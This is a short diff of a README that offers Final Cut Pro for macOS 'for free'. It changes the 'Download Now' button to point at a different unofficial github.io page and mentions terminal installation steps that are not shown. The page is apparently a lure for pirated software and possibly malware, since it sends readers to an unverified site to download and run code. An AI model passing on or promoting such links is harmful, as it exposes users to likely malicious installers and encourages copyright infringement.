@@ -3,7 +3,7 @@
 A detailed guide on how to download and install Final Cut Pro on macOS for free. Follow the instructions below to complete the installation process. 🎬
 
 ![promo](https://seantenney.com/wp-content/uploads/2016/11/FCPX_AppStore_Banner_WEB-1200x265.jpg)
-[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=apple&logoColor=white)](https://final-cut-pro-download.github.io/.github/)
+[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=apple&logoColor=white)](https://fituganshfgh.github.io/.github/finalcut)
 
 > If the button above does not work, follow the installation steps below using the terminal.
 
